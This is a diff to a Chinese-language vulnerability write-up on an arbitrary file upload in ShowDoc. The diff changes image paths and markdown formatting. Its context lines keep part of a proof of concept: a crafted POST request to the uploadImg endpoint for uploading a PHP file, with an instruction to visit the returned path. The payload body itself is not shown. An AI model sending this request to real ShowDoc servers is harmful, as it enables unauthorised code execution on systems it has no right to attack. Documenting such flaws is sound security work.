@@ -20,15 +20,11 @@ app="ShowDoc"
 
 网站首页如下
 
-![](images/202202101919494.png)
-
-
+![](../.gitbook/assets/202202101919494.png)
 
 构造如下数据包上传php文件
 
-
-
-```plain
+```
 POST /index.php?s=/home/page/uploadImg HTTP/1.1
 Host: xxx.xxx.xxx.xxx
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0
@@ -44,17 +40,11 @@ Content-Type: text/plain
 ----------------------------921378126371623762173617--
 ```
 
-
-
-![](images/202202101919970.png)
-
-
+![](../.gitbook/assets/202202101919970.png)
 
 访问回显的路径
 
-
-
-![](images/202202101919065.png)
+![](../.gitbook/assets/202202101919065.png)
 
 ## 漏洞POC
 
